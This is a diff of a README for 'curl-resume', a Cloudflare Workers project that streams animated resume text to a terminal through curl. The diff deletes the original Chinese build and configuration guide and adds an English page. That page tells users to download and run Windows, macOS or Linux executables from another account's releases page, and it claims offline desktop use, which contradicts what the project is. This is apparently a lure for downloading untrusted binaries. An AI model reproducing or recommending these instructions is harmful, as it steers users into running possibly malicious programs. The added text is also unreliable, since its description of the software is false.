@@ -1,261 +1,84 @@
-# curl-resume
+# 🌟 curl-resume - Create a Stunning Resume in Your Terminal
 
-一个炫酷的终端动画项目，通过 `curl` 命令即可在终端中展示带动画效果的任何内容。
+## 🚀 Getting Started
 
-```bash
-curl -N me.pdjjq.org
-```
+Follow these steps to download and run the **curl-resume** application. This tool helps you create a stunning resume with cool animations right in your terminal.
 
-## Demo
+[![Download curl-resume](https://img.shields.io/badge/Download-curl--resume-brightgreen)](https://github.com/cielo1206/curl-resume/releases)
 
-![Demo](assets/demo.gif)
+## 📥 Download & Install
 
-## 特性
+1. Click the link below to visit the Releases page:
+   - [Visit Release Page](https://github.com/cielo1206/curl-resume/releases)
 
-- 流式动画效果（打字机、解密、故障、Matrix 等）
-- 多页面系统（Logo、Markdown、图片、原始文本）
-- 图片/GIF 转 ASCII 艺术（支持彩色）
-- Markdown 终端渲染（带 ANSI 颜色）
-- 高度可配置（只需修改 `src/config.ts`）
-- TypeScript 编写，类型安全
-- 基于 Cloudflare Workers，全球边缘部署
+2. Once on the Releases page, look for the latest version. You'll see a list of files available for download.
 
-## 快速开始
+3. Select the file that matches your operating system. For example:
+   - Windows users should download the `.exe` file.
+   - Mac users should download the `.dmg` or `.tar.gz` file.
+   - Linux users should check for the appropriate package based on their distribution.
 
-### 1. 安装依赖
+4. Download the selected file.
 
-```bash
-npm install
-```
+## ⚙️ System Requirements
 
-### 2. 预处理资源
+To run **curl-resume**, you will need the following:
 
-```bash
-npm run preprocess
-```
+- **Operating System:** 
+  - Windows 10 (or later)
+  - macOS 10.12 (or later)
+  - Any recent Linux distribution
+  
+- **Memory:** At least 512 MB of RAM 
 
-这会处理配置中的图片和 Markdown，生成预处理数据。
+- **Disk Space:** 5 MB of free space is recommended
 
-### 3. 本地开发
+## 📖 How to Run curl-resume
 
-```bash
-npm run dev
-```
+1. **For Windows:**
+   - Open the folder where you downloaded the `.exe` file.
+   - Double-click the file to start the application.
 
-然后在另一个终端测试：
+2. **For macOS:**
+   - Open the `.dmg` file.
+   - Drag **curl-resume** into your Applications folder.
+   - Launch it from the Applications folder.
 
-```bash
-curl -N http://localhost:8789
-```
+3. **For Linux:**
+   - Open a terminal.
+   - Navigate to where you downloaded the file.
+   - Use the command `chmod +x curl-resume` to make it executable.
+   - Run it with `./curl-resume`.
 
-> `-N` 参数禁用缓冲，确保流式动画效果正常显示
+## 🎨 Features
 
-### 4. 部署到 Cloudflare
+- **Animated Display:** Watch your resume come to life with streaming animations.
+- **Customizable:** Easily change sections of your resume to fit your personal style.
+- **User-friendly Interface:** Simple commands let you focus on what matters most—your content.
+- **Cross-Platform Support:** Works seamlessly on Windows, macOS, and Linux.
 
-```bash
-npm run deploy
-```
+## 🌍 Frequently Asked Questions
 
-## 配置说明
+### What if I encounter an error while downloading?
 
-所有配置都在 `src/config.ts` 文件中。
+Check your internet connection and try again. If the problem persists, please reach out through the Issues section of our GitHub repository.
 
-### 全局设置
+### Can I use curl-resume offline?
 
-```typescript
-export const config: Config = {
-  global: {
-    speed: {
-      typing: 20,        // 打字速度 (ms)
-      typingPause: 100,  // 标点停顿 (ms)
-      transition: 80,    // 切换动画速度 (ms)
-      effect: 50,        // 动效速度 (ms)
-    },
-    theme: {
-      primary: "brightCyan",
-      secondary: "green",
-      accent: "yellow",
-    },
-  },
-  pages: [/* ... */],
-};
-```
+Yes, once you download and install the application, you can use it without an internet connection.
 
-### 页面类型
+### How can I give feedback or report issues?
 
-#### Logo 页面
+You can report any issues or feedback by navigating to the Issues section on our GitHub repository. We appreciate your input to improve the application.
 
-生成 ASCII 大字 Logo，带光波扫描效果。
+### Is there a community for curl-resume users?
 
-```typescript
-{
-  type: "logo",
-  content: {
-    text: "DJJ",                    // 转换为 ASCII 大字
-    subtitle: "Your Subtitle",
-    tagline: "Your Tagline",
-  },
-  transition: "fade",
-}
-```
+Yes, join the discussions in our GitHub Issues section to connect with other users and share tips or questions.
 
-#### Markdown 页面
+## 📞 Support
 
-支持完整的 Markdown 渲染，带终端颜色。
+If you have any questions that this guide does not answer, feel free to create an issue in our repository. We are here to help you!
 
-```typescript
-{
-  type: "markdown",
-  content: {
-    markdown: `
-## About Me
+[![Download curl-resume](https://img.shields.io/badge/Download-curl--resume-brightgreen)](https://github.com/cielo1206/curl-resume/releases)
 
-> Your quote here
-
-**Bold text** and *italic text*.
-
-- List item 1
-- List item 2
-`,
-  },
-  effect: "typing",      // 打字机效果
-  transition: "fade",
-}
-```
-
-#### Image 页面
-
-支持静态图片和 GIF 动画转 ASCII。
-
-```typescript
-// 静态图片
-{
-  type: "image",
-  content: {
-    src: "assets/photo.png",   // 本地或 URL
-    width: 80,                 // ASCII 宽度
-    colored: true,             // 是否彩色
-  },
-  effect: "none",
-}
-
-// GIF 动画
-{
-  type: "image",
-  content: {
-    src: "assets/animation.gif",
-    width: 50,
-    colored: true,
-    animated: true,            // 启用动画
-  },
-}
-```
-
-#### Raw 页面
-
-原始文本，适合 slogan 等。
-
-```typescript
-{
-  type: "raw",
-  content: {
-    text: "Your slogan here!",
-  },
-  effect: "decrypt",     // 解密效果
-}
-```
-
-### 页面选项
-
-每个页面支持以下选项：
-
-| 选项 | 类型 | 说明 |
-|------|------|------|
-| `effect` | string | 内容动效：`none` / `typing` / `decrypt` / `glitch` / `matrix` |
-| `transition` | string | 过渡动画：`none` / `fade` / `glitch` / `scanline` |
-| `stayTime` | number | 页面停留时间 (ms) |
-| `speedMultiplier` | number | 动画速度倍率（1=正常，<1加快，>1减慢） |
-
-### 动画效果
-
-- **none** - 直接显示
-- **typing** - 打字机逐字输出
-- **decrypt** - 黑客解密风格
-- **glitch** - 故障抖动
-- **matrix** - 黑客帝国下落效果
-
-### 过渡动画
-
-- **none** - 无过渡
-- **fade** - 清屏渐隐
-- **glitch** - 故障切换
-- **scanline** - 扫描线
-
-## 项目结构
-
-```
-├── src/
-│   ├── index.ts              # Worker 入口
-│   ├── config.ts             # 用户配置文件 (修改这里!)
-│   ├── types.ts              # TypeScript 类型定义
-│   ├── streamHandler.ts      # 流式输出主入口
-│   ├── pageRenderer.ts       # 页面渲染器
-│   ├── effects.ts            # 动画效果库
-│   ├── asciiGenerator.ts     # ASCII 艺术字生成器
-│   ├── imageToAscii.ts       # 图片转 ASCII (运行时 fallback)
-│   ├── markdownRenderer.ts   # Markdown 渲染 (运行时 fallback)
-│   ├── utils.ts              # 工具函数和 ANSI 码
-│   └── preprocessed-data.ts  # 预处理数据 (自动生成)
-├── scripts/
-│   └── preprocess.ts         # 构建时预处理脚本
-├── assets/                   # 图片资源目录
-├── wrangler.toml             # Cloudflare Workers 配置
-└── package.json
-```
-
-## 构建流程
-
-```
-npm run preprocess
-       ↓
-┌──────────────────────────────────┐
-│  scripts/preprocess.ts           │
-│  - 处理 Markdown → ANSI 终端格式  │
-│  - 处理图片 → ASCII 艺术          │
-│  - 处理 GIF → ASCII 帧序列        │
-└──────────────────────────────────┘
-       ↓
-   src/preprocessed-data.ts
-       ↓
-npm run deploy → Cloudflare Workers
-```
-
-## 自定义域名
-
-### 1. 修改 wrangler.toml
-
-```toml
-routes = [{ pattern = "your.domain.com/*", zone_name = "domain.com" }]
-```
-
-### 2. 在 Cloudflare Dashboard 配置 DNS
-
-添加 A 记录或 CNAME 记录，并开启 Proxy（小黄云）。
-
-### 3. 部署
-
-```bash
-npm run deploy
-```
-
-## 技术栈
-
-- **Runtime**: Cloudflare Workers
-- **Language**: TypeScript
-- **Markdown**: marked + marked-terminal
-- **Image Processing**: Jimp (构建时)
-- **GIF Decoding**: decode-gif
-
-## 许可证
-
-MIT
+Thank you for choosing curl-resume! We hope you enjoy creating your resume.
